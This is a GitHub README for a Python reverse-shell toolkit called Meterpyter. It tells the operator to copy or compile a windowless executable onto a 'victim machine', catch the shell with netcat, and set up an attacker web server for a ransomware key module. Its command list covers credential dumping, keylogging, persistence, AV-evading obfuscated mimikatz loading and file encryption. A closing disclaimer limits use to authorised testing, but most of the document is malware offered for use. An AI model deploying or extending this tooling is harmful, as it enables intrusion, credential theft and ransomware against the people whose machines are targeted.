# GLDX-Meterpyter
Reverse Shell made in python / Acting as a Mini Meterpreter version 

## Installation / Execution

You first need to change LHOST IP Address in Meterpyter.py

<img width="457" height="46" alt="image" src="https://github.com/user-attachments/assets/23a350ef-5491-4bc2-9945-45b65bdd9ba3" />


### Using it with Python (3.14)
Copy Meterpyter.py to your victim machine
```shell
pip install -r requirements.txt
python .\Meterpyter.py
```

### Using .exe
You need a Windows Environnement to compile .py to .exe
```shell
pip install PyInstaller
PyInstaller --noconsole --onefile .\Meterpyter.py --clean
```

Then, move ./dist/Meterpyter.exe to your victim machine and double click

### Execution 
On your attacking machine
```shell
nc -lvnp 4444 (or whatever port you want to change to)
```
<img width="325" height="24" alt="image" src="https://github.com/user-attachments/assets/ee18ffa9-7b33-40d7-96a7-6ccf564a5942" />

You now should have an opened reverse shell !



## Apache Configuration
Some module wille try to contact a web server to download/upload and store information when using customized commands
```shell
Ex : startransom -> GET 'key=123456' -> ransomware.php -> ...../ID/123456/key.txt
```
This will sends requests to the attacker web server, generating and storing the key to cryptolock the victime computer
To be sure that you have the correct configuration, you have to :
  - Put all .zip and .ps1 file in a new **download** directory (default /var/www/html/download)
  - Create a new **upload** directory (default /var/www/html/download)
  - Create a new **ransomware** directory (default ...../ransomware)
    - In this folder, move every .php and keygen.py there
    - Important : Under ransomware/ create a **ID** directory
    - apply this
      ```bash
      sudo setfacl -R -m d:u::rwx,d:g::rwx,d:o::rwx ID/
      ```
To make your life easier, you can
```bash
sudo chmod 777 -R /var/www/html/
```



## Usage
First, you can type 'help' to display the full commands menu  
Some of them are not implemented yet, but you can still use :
```shell
Basic Commands:
    cd <directory> - Change directory
    cat <file> - Read a file (PowerShell)
    exit - Exit the shell
    help - Show this help menu
    clear - Clear the screen

Post Exploitation commands:
    Recon & Discovery:
        sysinfo - Get system information
        arpscan - Scan local network for devices
        netstat or netstat <kind> - Show network connections (kind: inet, inet4, inet6, tcp, tcp4, tcp6, udp, udp4, udp6, unix)
        listlocalusers
        listdomainusers (Not implemented)
        portscan [start_port] [end_port] - Scan ports on local 
        remoteportscan <target_ip> [start_port] [end_port] - Scan ports on a remote target
        
    File Operations:
        search <path> <filename>/<dirname> - Search for a file or directory by name
        download <filepath> <port> - Download a file from the target 
        upload <filepath> <port> - Upload a file to the target 
        zipdownload <filepath> <port> - upload a directory from user session

    Persistence Mechanisms:
        addschedule - Add a persistence scheduled task (using tasks planner for Windows)
        addstartup - Add a startup entry (using regedit run key for Windows)
        rdp on/off - Enable or disable RDP access
        createlocaluser <username> <password>/nopass - Create a local user
        createdomainuser <username> <password>/nopass - Create a domain user
        rdpgroupadd <username> - Add a user to the Remote Desktop Users group
        admingroupadd local/domain <username> - Add a user to the local or domain Administrators group

    Process & Service Management:
        ps - List running processes
        kill <pid> - Kill a process by PID (not implemented)
        dump <pid> - Dump process memory (not implemented)
        migrate <pid> - Migrate to another process (not implemented)

    Credential Dump:
        lsadump - Dump LSA secrets
        samdump - Dump SAM database
        dumpnav - Dump Edge/Chrome/Firefox/... passwords

    Privilege Escalation:
        getprivs - Attempt to enable all privileges
        getsystem - Attempt to elevate privileges to SYSTEM
        whoami - check current user privileges (Display if SYSTEM for debugging)

    External Modules Management:                       
        Loading or Running External Modules:
            loadmodule <module_name> - Load an external module (Try to download from attacker web server)
            loadmodule all - Load all external modules
            runmodule <module> <args> - Run a loaded module (After having loaded it with one loadmodule command)
                - godpotato (Might not work on all Windows versions, requires specific conditions to be met)   
                - inveigh (Not working actually) 
                - kekeo      
                - lazagne   
                - mimikatz  
                - rubeus    
                - sauroneye
                - snaffler

        Loading or Running External PWSH Modules (Tools usually built in C#/exe but as PowerShell Invoke-* scripts : file existing on drive):
            loadpwshmodule <module_name> - Load an external pwsh module (Try to download from attacker web server)
            loadpwshmodule all - Load all external pwsh modules
            runpwshmodule <module> <args> - Run a loaded pwsh module with arguments (After having loaded it with one loadpwshmodule command)
                - amsi
                - etw   
                - byovd
                - bloodhound
                - godpotato (Might not work on all Windows versions, requires specific conditions to be met)
                - inveigh (Not working actually)
                - mimikatz
                - powersploit
                - rubeus
                - sauroneye
                - snaffler (Pwsh version not working actually)
                - winpeas

        Loading or Running Obfuscated PWSH Modules (Same as loadpwshmodule but with an obfuscated version of the module for more stealthy persistence on disk):
            loadobfpwshmodule <module_name> - Load an obfuscated version of a pwsh module (Try to download from attacker web server)
            loadobfpwshmodule all - Load obfuscated versions of all pwsh modules
            runobfpwshmodule <module> <args> - Run an obfuscated loaded pwsh module with arguments (After having loaded it with one loadobfpwshmodule command)
                - amsi
                - bloodhound
                - etw
                - inveigh
                - mimikatz
                - sauroneye
                - winpeas (coming ASAP)

        Loading & Running in Memory PWSH Modules (Same as loadpwshmodule but run the module in memory without writing it on disk for more stealth):
            loadrunmempwshmodule <module> <args> - Run a loaded pwsh module in memory with arguments (After having loaded it with one loadmempwshmodule command)
                - godpotato (Might not work on all Windows versions, requires specific conditions to be met)
                - inveigh (Not working actually)
                - mimikatz
                - rubeus
                - sauroneye
                - snaffler (Pwsh version not working actually)

        Loading & Running in Memory Obfuscated PWSH Modules (Same as loadobfpwshmodule but run the module in memory without writing it on disk for more stealth):
            loadrunobfmempwshmodule <module> <args> - Run an obfuscated loaded pwsh module in memory with arguments (After having loaded it with one loadobfmempwshmodule command)
                - mimikatz

        Unloading External Modules:
            removemodule <module_name> - Remove an external module
            removemodule all - Remove all external modules
            
    User Control:
        getscreen - Capture and send a screenshot
        startkeylogger - Start keylogger
        stopkeylogger - Stop keylogger
        av on/off - Start or stop antivirus (Not working actually)
        fw on/off - Start or stop firewall (Not working actually)

    Ransomware Module:
        startransom (default : C:/users/<currentuser>) or startransom <path> - Start ransomware encryption
        stopransom (default : C:/users/<currentuser>) or stopransom <path> - Stop ransomware encryption

    Open Terminal
        pwsh - Open a PowerShell terminal
        cmd - Open a CMD terminal (Windows only) (not implemented)

    Default CMD commands:
        winget (Not implemented
```

# DEMO #
<img width="804" height="268" alt="image" src="https://github.com/user-attachments/assets/13fd422c-8f30-420d-a138-0935cf40135f" />


# DISCLAIMER #
Meterpyter is provided for educational and authorized security testing purposes only.

By using this project, you agree to use it only on systems and networks you own or for which you have explicit permission.
Any misuse, unauthorized access, or illegal activity is strictly prohibited.

The author and contributors assume no liability and are not responsible for any damage, data loss, legal consequences, or misuse resulting from this project.
